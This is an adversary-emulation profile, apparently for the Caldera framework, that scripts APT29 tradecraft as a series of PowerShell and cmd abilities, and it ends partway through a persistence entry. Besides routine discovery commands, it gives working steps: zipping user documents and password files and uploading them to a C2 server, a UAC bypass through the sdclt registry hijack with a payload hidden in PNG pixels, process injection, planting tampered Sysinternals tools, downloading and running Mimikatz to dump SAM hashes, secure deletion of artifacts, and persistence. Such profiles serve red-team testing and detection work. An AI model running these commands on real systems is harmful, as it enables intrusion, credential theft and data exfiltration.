id: 4975696e-1d41-11eb-adc1-0242ac120002
name: APT29
description: APT29 is a threat group that has been attributed to the Russian government who have been in operation since at least 2008. This group reportedly compromised the Democratic National Committee starting in the summer of 2015. (Emu)
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- 571845f6-b75c-4b9d-a666-a78f7827261f
- a5daa530-c640-49bc-aa54-6808789a684a
- 5692da31-3586-4e4f-8f07-5750070c730b
- ee08a427-1e1d-4d8a-aeb1-978a7fcf9087
- 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce
- 35d95b64-c1f8-4ac7-a2f2-8959218239cd
- 68e209dd-f354-4adc-8bc6-e85a3e55a7f4
- 5df12481-9d8c-4235-b550-9cefc8ed7361
- 41610306-087c-4c34-874b-37b8ed633a36
- 2ff877b4-0c00-401e-9d3f-070c70b610df
- 144b1384-5060-494f-80eb-91772695cdf3
- d2ea2676-7f85-4228-b980-ab3c0e1adc03
- 7c2a6e5b-1adb-464f-a581-4677391f8dd6
- faa96e7f-081a-40b7-a743-a6a7f2627ea3
- 26181249-be75-41ed-9fe7-5c30ea8c2d4d
- 84377d7a-0363-44fd-a082-44657ca1858f
- 61221fb9-cb32-46d5-98fd-90567a621526
- 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76
- 5c23f638-9cfc-4fc4-9cab-4af628fef70a
- 68b588bc-002a-42dc-bac7-9189f944065b
- 1345bff7-6f26-43b2-a92a-9aabccdb3db0
- 89e9dffa-8836-4672-8cf3-bebd006d2a2b
- 5ff80022-8d85-410b-b868-6c7565b267e5
- 088b8639-3f37-42cc-9dc8-01aabb645461
- 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d
- 59592c35-8207-4896-8d8b-36ad4600245d
- 24ed020e-4730-4000-b6b4-6b5d3e95314f
- 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b
- 646be6c9-f27a-4f5f-be5d-b8a0317e215f
- 9b5b5aec-32ff-4d74-8555-727b50ab15f6
- 6f1f4768-7099-45d2-a858-b49dc792234e
- ba0b398d-91b8-490a-bed2-f959afa8e1aa
- effbedc1-1bc8-4a75-9395-980559700008
- 9c75155e-21ab-4471-af16-45f3795a313c
- 45f18b58-c14f-4b61-a3da-41b67af21429
- 03afada1-1714-408f-bde5-f528b91dc89d
- e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d
- 1b9e018d-986d-42d9-bb8b-0e104e98ce9c
- c4f4b13c-87b6-498c-b814-93570173068c
- a4b14c10-49aa-4ae4-b165-d5a37364fe62
- a81ea4ad-bc9f-49a7-82d4-4466df641487
- ee4c2eab-be57-434c-a32c-14b77360301a
- db28f68d-e8b8-46e6-b680-642570d4b257
- a612311d-a802-48da-bb7f-88a4b9dd7a24
- 9b518cfb-125f-466e-872b-4f8171773ce5
- 6b90da47-13d0-48fc-8f07-0a1e6d5d876e
- 95564347-e77a-4a89-b08f-dcafa5468f2c
- c4a59e39-53b0-4ace-9528-8ff052752ece
- 9fefcde6-083a-4440-8eca-dc03d30c0bcb
- bddc0abc-07a0-41b7-813f-e0c64d9226b3
- 0b1841bd-ef8b-475c-bce7-8fcb2860984a
- d5170a60-3bdc-44e0-9870-a38db5c0cf81
- 08e57385-dbce-4850-8bb7-589ef79465ab
- 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6
- 208b021b-c79a-4176-8ad1-3af99ed50c6f
- 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
- 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92
- 00446217-53ca-4749-bacd-f41fe189d36e
- e506f811-884d-4992-aacb-514b33a0324f
- 4a2ad84e-a93a-4b2e-b1f0-c354d6a41278
- f9c0b150-822f-497b-ad6d-187f24561e9a
- 2b5a72b1-01e4-48ae-98b0-2570a7894371
- 0cfadbcb-ec21-44ae-adb7-9a23176dd620
- 96140694-6d13-40b6-9553-0e63533469f3
- f320eebd-e75b-4194-b529-79e64ad0b9ee
- a34ab8f2-a106-41fb-af0b-cf5382bd18ae
- 5226e5dc-fc28-43b7-a679-0db49d520402
- 4ef6009d-2d62-4bb4-8de9-0458df2e9567
- 1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24
- 43aad2d6-d16a-4adb-aa2b-9510a3be4c52
- 1c8552c7-f7ed-4523-b640-72d65af5f855
- a42be479-fc26-4d7c-9e63-7a9b74e4c8d2
- acecc8f7-18c2-41fd-87bc-39ffd644e4e9
- b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c
- fc231955-774f-442c-ac0e-e74dfda50c5c
- 4840d6dd-da13-401a-be46-05db56f4e1e0
- f820b93d-6176-4a72-a138-a70b0b549c49
- 267bad86-3f06-49f1-9a3e-6522f2a61e7a
- afb8d8f7-d059-4825-95ae-c5727e2db320
abilities:
 571845f6-b75c-4b9d-a666-a78f7827261f:
  name:  RTLO Start Sandcat
  tactic:  execution
  technique_name:  "Masquerading: Right-to-Left Override"
  technique_id:  T1036.002
  executors: 
   - psh:
     platform: windows
     command: |
       Sleep 3;
       $bin = Get-ChildItem *cod*scr*;
       $arguments = '-server "#{server}" -group "rtlo_group"';
       start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
       
       if ($?) {
         write-host "Successfully completed RTLO execution. A new agent should appear";
         exit 0;
       
       } else {
         write-host "Failure of RTLO execution.";
         exit 1;
       }
   - pwsh:
     platform: windows
     command: |
       Sleep 3;
       $bin = Get-ChildItem *cod*scr*;
       $arguments = '-server "#{server}" -group "rtlo_group"';
       start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
       
       if ($?) {
         write-host "Successfully completed RTLO execution. A new agent should appear";
         exit 0;
       
       } else {
         write-host "Failure of RTLO execution.";
         exit 1;
       }
 a5daa530-c640-49bc-aa54-6808789a684a:
  name:  PowerShell
  tactic:  execution
  technique_name:  "Command and Scripting Interpreter: PowerShell"
  technique_id:  T1059.001
  executors: 
   - cmd:
     platform: windows
     command: |
       powershell.exe;
       if ($?) {
         write-host "[*] PowerShell successfully spawned";
         exit 0;
       }
 5692da31-3586-4e4f-8f07-5750070c730b:
  name:  Automated Collection
  tactic:  collection
  technique_name:  "Automated Collection"
  technique_id:  T1119
  executors: 
   - psh:
     platform: windows
     command: |
       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
   - pwsh:
     platform: windows
     command: |
       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
 ee08a427-1e1d-4d8a-aeb1-978a7fcf9087:
  name:  System Network Configuration Discovery
  tactic:  discovery
  technique_name:  "System Network Configuration Discovery"
  technique_id:  T1016
  executors: 
   - cmd:
     platform: windows
     command: |
       ipconfig /all
 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce:
  name:  System Network Configuration Discovery
  tactic:  discovery
  technique_name:  "System Network Configuration Discovery"
  technique_id:  T1016
  executors: 
   - cmd:
     platform: windows
     command: |
       arp -a
 35d95b64-c1f8-4ac7-a2f2-8959218239cd:
  name:  System Owner / User Discovery
  tactic:  discovery
  technique_name:  "System Owner/User Discovery"
  technique_id:  T1033
  executors: 
   - cmd:
     platform: windows
     command: |
       echo %USERDOMAIN%\%USERNAME%
 68e209dd-f354-4adc-8bc6-e85a3e55a7f4:
  name:  Data from staged fileand Exfiltration over C2 Channel
  tactic:  exfiltration
  technique_name:  "Exfiltration Over Command and Control Channel"
  technique_id:  T1041
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\upload.ps1 -Verbose -Force;
       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
   - pwsh:
     platform: windows
     command: |
       Import-Module .\upload.ps1 -Verbose -Force;
       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
 5df12481-9d8c-4235-b550-9cefc8ed7361:
  name:  Process Discovery
  tactic:  discovery
  technique_name:  "Process Discovery"
  technique_id:  T1057
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\ps.ps1 -Verbose -Force;
       ProcessList
   - pwsh:
     platform: windows
     command: |
       Import-Module .\ps.ps1 -Verbose -Force;
       ProcessList
 41610306-087c-4c34-874b-37b8ed633a36:
  name:  Process Discovery
  tactic:  discovery
  technique_name:  "Process Discovery"
  technique_id:  T1057
  executors: 
   - cmd:
     platform: windows
     command: |
       tasklist /v
 2ff877b4-0c00-401e-9d3f-070c70b610df:
  name:  System Service Discovery
  tactic:  discovery
  technique_name:  "System Service Discovery"
  technique_id:  T1007
  executors: 
   - cmd:
     platform: windows
     command: |
       sc query
 144b1384-5060-494f-80eb-91772695cdf3:
  name:  System Service Discovery
  tactic:  discovery
  technique_name:  "System Service Discovery"
  technique_id:  T1007
  executors: 
   - cmd:
     platform: windows
     command: |
       net start
 d2ea2676-7f85-4228-b980-ab3c0e1adc03:
  name:  System Information Discovery
  tactic:  discovery
  technique_name:  "System Information Discovery"
  technique_id:  T1082
  executors: 
   - cmd:
     platform: windows
     command: |
       systeminfo
 7c2a6e5b-1adb-464f-a581-4677391f8dd6:
  name:  System Information Discovery
  tactic:  discovery
  technique_name:  "System Information Discovery"
  technique_id:  T1082
  executors: 
   - cmd:
     platform: windows
     command: |
       net config workstation
 faa96e7f-081a-40b7-a743-a6a7f2627ea3:
  name:  Permissions Groups Discovery
  tactic:  discovery
  technique_name:  "Permission Groups Discovery"
  technique_id:  T1069
  executors: 
   - cmd:
     platform: windows
     command: |
       net localgroup administrators
 26181249-be75-41ed-9fe7-5c30ea8c2d4d:
  name:  Permissions Groups Discovery
  tactic:  discovery
  technique_name:  "Permission Groups Discovery"
  technique_id:  T1069
  executors: 
   - cmd:
     platform: windows
     command: |
       net localgroup administrators /domain
 84377d7a-0363-44fd-a082-44657ca1858f:
  name:  Permissions Groups Discovery
  tactic:  discovery
  technique_name:  "Permission Groups Discovery"
  technique_id:  T1069
  executors: 
   - psh:
     platform: windows
     command: |
       cmd.exe /c net group "Domain Admins" /domain
   - pwsh:
     platform: windows
     command: |
       cmd.exe /c net group "Domain Admins" /domain
 61221fb9-cb32-46d5-98fd-90567a621526:
  name:  Account Discovery
  tactic:  discovery
  technique_name:  "Account Discovery"
  technique_id:  T1087
  executors: 
   - cmd:
     platform: windows
     command: |
       net user /domain
 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76:
  name:  Account Discovery
  tactic:  discovery
  technique_name:  "Account Discovery"
  technique_id:  T1087
  executors: 
   - cmd:
     platform: windows
     command: |
       net user %USERNAME% /domain
 5c23f638-9cfc-4fc4-9cab-4af628fef70a:
  name:  Query Registry
  tactic:  discovery
  technique_name:  "Query Registry"
  technique_id:  T1012
  executors: 
   - cmd:
     platform: windows
     command: |
       reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 68b588bc-002a-42dc-bac7-9189f944065b:
  name:  Staging monkey PNG
  tactic:  defensive-evasion
  technique_name:  "Masquerading: Match Legitimate Name or Location"
  technique_id:  T1036.005
  executors: 
   - psh:
     platform: windows
     command: |
       $username="#{profile_user}";
       if ( $(test-path -path "C:\Users\$username\Downloads\monkey.png") -eq $false ) {
         copy-item monkey.png -Destination "C:\Users\$username\Downloads\\" -Force;
         if ($? -eq $True) {
           write-host "[+] Successfully copied monkey.png!";
           get-childitem -path "C:\Users\$username\Downloads\\";
           exit 0;
         } else {
           write-host "[+] Failed to copy monkey.png.";
           exit 1;
         }
       
         } else {
           write-host "[*] monkey.png already exists within C:\users\$username\Downloads..."
         }
   - pwsh:
     platform: windows
     command: |
       $username="#{profile_user}";
       if ( $(test-path -path "C:\Users\$username\Downloads\monkey.png") -eq $false ) {
         copy-item monkey.png -Destination "C:\Users\$username\Downloads\\" -Force;
         if ($? -eq $True) {
           write-host "[+] Successfully copied monkey.png!";
           get-childitem -path "C:\Users\$username\Downloads\\";
           exit 0;
         } else {
           write-host "[+] Failed to copy monkey.png.";
           exit 1;
         }
       
         } else {
           write-host "[*] monkey.png already exists within C:\users\$username\Downloads..."
         }
 1345bff7-6f26-43b2-a92a-9aabccdb3db0:
  name:  Bypass User Account Control
  tactic:  privilege-escalation
  technique_name:  "Access Token Manipulation: Token Impersonation/Theft"
  technique_id:  T1134.001
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
       Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
       $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
       Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
   - pwsh:
     platform: windows
     command: |
       Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
       Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
       $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
       Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
 89e9dffa-8836-4672-8cf3-bebd006d2a2b:
  name:  UAC Bypass via Backup Utility
  tactic:  privilege-escalation
  technique_name:  "Abuse Elevation Control Mechanism: Bypass User Account Control"
  technique_id:  T1548.002
  executors: 
   - psh:
     platform: windows
     command: |
       if (!(test-path -path $env:windir\system32\sdclt.exe)) {
         write-host "[!] sdclt.exe was not found on this host.";
         exit 1;
       }
       New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
       New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
       New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
       New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
       
       $username="#{profile_user}";
       $payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';
       
       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;
       
       cmd.exe /c sdclt.exe;
       cmd.exe /c powershell.exe;
   - pwsh:
     platform: windows
     command: |
       if (!(test-path -path $env:windir\system32\sdclt.exe)) {
         write-host "[!] sdclt.exe was not found on this host.";
         exit 1;
       }
       New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
       New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
       New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
       New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
       
       $username="#{profile_user}";
       $payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';
       
       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;
       
       cmd.exe /c sdclt.exe;
       cmd.exe /c powershell.exe;
 5ff80022-8d85-410b-b868-6c7565b267e5:
  name:  Registry Cleanup for UAC Bypass Technique
  tactic:  defensive-evasion
  technique_name:  "Modify Registry"
  technique_id:  T1112
  executors: 
   - psh:
     platform: windows
     command: |
       Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
       if (!(test-path -path HKCU:\Software\Classes\Folder)) {
         write-host "[+] Reg keys removed!";
        }
   - pwsh:
     platform: windows
     command: |
       Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
       if (!(test-path -path HKCU:\Software\Classes\Folder)) {
         write-host "[+] Reg keys removed!";
        }
 088b8639-3f37-42cc-9dc8-01aabb645461:
  name:  Process Injection
  tactic:  privilege-escalation
  technique_name:  "Process Injection"
  technique_id:  T1055
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
       Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
       $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
       Inject -PoshCode $pcode;
   - pwsh:
     platform: windows
     command: |
       Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
       Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
       $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
       Inject -PoshCode $pcode;
 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d:
  name:  Planting Modified Sysinternals Utilities
  tactic:  stage-capabilities
  technique_name:  "Masquerading: Match Legitimate Name or Location"
  technique_id:  T1036.005
  executors: 
   - psh:
     platform: windows
     command: |
       iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
       Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;
       
       if (! $?) {
         write-host "Error moving files to #{profile_user}\Downloads";
         exit 1;
       }
       
       Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
       Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;
       
       if (! $?) {
         write-host "Error expanding files to #{profile_user}\Downloads";
         exit 1;
       }
       
       $dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
       if ($dir_exists -eq $true) {
         write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
         Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
         Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
       } else {
         mkdir "C:\Program Files\SysInternalsSuite";
         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
       }
       
       if (test-path -path "SysInternalsSuite.zip") {
         Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
       }
       
       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
       }
       
       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
       }
       
       if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
         Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
       }
       
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       if ($?) {
         gci;
         write-host "[*] Successfully planted files"
       } else {
         write-host "[!] Error downloading and planting modified system tools."
       }
   - pwsh:
     platform: windows
     command: |
       iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
       Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;
       
       if (! $?) {
         write-host "Error moving files to #{profile_user}\Downloads";
         exit 1;
       }
       
       Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
       Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;
       
       if (! $?) {
         write-host "Error expanding files to #{profile_user}\Downloads";
         exit 1;
       }
       
       $dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
       if ($dir_exists -eq $true) {
         write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
         Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
         Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
       } else {
         mkdir "C:\Program Files\SysInternalsSuite";
         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
       }
       
       if (test-path -path "SysInternalsSuite.zip") {
         Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
       }
       
       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
       }
       
       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
       }
       
       if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
         Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
       }
       
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       if ($?) {
         gci;
         write-host "[*] Successfully planted files"
       } else {
         write-host "[!] Error downloading and planting modified system tools."
       }
 59592c35-8207-4896-8d8b-36ad4600245d:
  name:  Remote System Discovery
  tactic:  discovery
  technique_name:  "Remote System Discovery"
  technique_id:  T1018
  executors: 
   - psh:
     platform: windows
     command: |
       cmd.exe /c net group "Domain Controllers" /domain
   - pwsh:
     platform: windows
     command: |
       cmd.exe /c net group "Domain Controllers" /domain
 24ed020e-4730-4000-b6b4-6b5d3e95314f:
  name:  Remote System Discovery
  tactic:  discovery
  technique_name:  "Remote System Discovery"
  technique_id:  T1018
  executors: 
   - psh:
     platform: windows
     command: |
       cmd.exe /c net group "Domain Computers" /domain
   - pwsh:
     platform: windows
     command: |
       cmd.exe /c net group "Domain Computers" /domain
 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b:
  name:  System Network Configuration Discovery
  tactic:  discovery
  technique_name:  "System Network Configuration Discovery"
  technique_id:  T1016
  executors: 
   - cmd:
     platform: windows
     command: |
       netsh advfirewall show allprofiles
 646be6c9-f27a-4f5f-be5d-b8a0317e215f:
  name:  Process Discovery
  tactic:  discovery
  technique_name:  "Process Discovery"
  technique_id:  T1057
  executors: 
   - psh:
     platform: windows
     command: |
       $ps = get-process;
       write-output $ps;
   - pwsh:
     platform: windows
     command: |
       $ps = get-process;
       write-output $ps;
 9b5b5aec-32ff-4d74-8555-727b50ab15f6:
  name:  Artifact Cleanup - Delete Files
  tactic:  defensive-evasion
  technique_name:  "Indicator Removal on Host: File Deletion"
  technique_id:  T1070.004
  executors: 
   - psh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysInternalsSuite";)) {
         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       gci $env:userprofile\Desktop;
       .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
       .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
       .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
   - pwsh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysInternalsSuite";)) {
         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       gci $env:userprofile\Desktop;
       .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
       .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
       .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
 6f1f4768-7099-45d2-a858-b49dc792234e:
  name:  Loading Stage-2 & Performing Discovery
  tactic:  discovery
  technique_name:  "System Information Discovery"
  technique_id:  T1082
  executors: 
   - psh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       if (!(test-path ".\readme.ps1")) {
         Move-Item .\readme.txt readme.ps1 -Force;
       }
       . .\readme.ps1;
       Invoke-Discovery;
   - pwsh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       if (!(test-path ".\readme.ps1")) {
         Move-Item .\readme.txt readme.ps1 -Force;
       }
       . .\readme.ps1;
       Invoke-Discovery;
 ba0b398d-91b8-490a-bed2-f959afa8e1aa:
  name:  4.C.2 - System Network Connections Discovery (T1049)
  tactic:  discovery
  technique_name:  "System Network Connections Discovery"
  technique_id:  T1049
  executors: 
   - cmd:
     platform: windows
     command: |
       netstat -ano
 effbedc1-1bc8-4a75-9395-980559700008:
  name:  Credential Dumping using Process Injection
  tactic:  credential-access
  technique_name:  "Credential Dumping"
  technique_id:  T1003
  executors: 
   - psh:
     platform: windows
     command: |
       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
       $web = (New-Object System.Net.WebClient);
       $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
       iex $result;
       function hashdump
       {
           Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
       };
       hashdump;
   - pwsh:
     platform: windows
     command: |
       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
       $web = (New-Object System.Net.WebClient);
       $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
       iex $result;
       function hashdump
       {
           Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
       };
       hashdump;
 9c75155e-21ab-4471-af16-45f3795a313c:
  name:  Persistent Service 1
  tactic:  persistence
  technique_name:  "Boot or Logon Autostart Execution: Shortcut Modification"
  technique_id:  T1547.009
  executors: 
   - psh:
     platform: windows
     command: |
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       if (get-service -name "javamtsup" -ErrorAction SilentlyContinue) {
         write-host "[*] Service already exists...Not running persistence step-1";
         exit 1;
       }
       
       if (Test-Path -path "readme.ps1") {
         . .\readme.ps1;
         Invoke-Persistence -PersistStep 1;
         write-host "[+] Persistence 1 invoked.";
         exit 0;
       
       } else {
         write-host "[!] readme.ps1 not found.";
         exit 1;
       }
   - pwsh:
     platform: windows
     command: |
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       if (get-service -name "javamtsup" -ErrorAction SilentlyContinue) {
         write-host "[*] Service already exists...Not running persistence step-1";
         exit 1;
       }
       
       if (Test-Path -path "readme.ps1") {
         . .\readme.ps1;
         Invoke-Persistence -PersistStep 1;
         write-host "[+] Persistence 1 invoked.";
         exit 0;
       
       } else {
         write-host "[!] readme.ps1 not found.";
         exit 1;
       }
 45f18b58-c14f-4b61-a3da-41b67af21429:
  name:  Persistent Service 2
  tactic:  persistence
